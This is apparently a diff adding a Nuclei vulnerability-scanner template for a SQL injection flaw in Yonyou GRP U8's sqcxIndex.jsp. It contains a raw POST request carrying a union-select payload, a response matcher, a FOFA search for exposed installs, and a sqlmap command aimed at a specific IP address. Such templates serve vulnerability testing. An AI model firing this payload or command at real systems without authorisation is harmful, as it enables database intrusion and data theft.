@@ -1,0 +1,31 @@
+id: yonyou-grp-u8-sqcxIndex-sqli
+
+info:
+  name: 用友 GRP U8 sqcxIndex.jsp - sqli
+  author: leadlife
+  severity: high
+  description: 
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BGRP-U8-sqcxIndex.jsp%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    fofa-query: app="用友-GRP-U8" || title="用友GRP-U8行政事业内控管理软件" || icon_hash="-299520369"
+    sqlmap: sqlmap -u "http://120.78.75.98:8021/u8qx/sqcxIndex.jsp?key=1" -p key
+  tags: yonyou,grpu8,sqli,oa
+
+http:
+  - raw:
+      - |
+        POST /u8qx/sqcxIndex.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
+        Accept: */*
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+
+        11=11&key=2%25')+union+select+@@version,111*111--+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(body,'12321')"
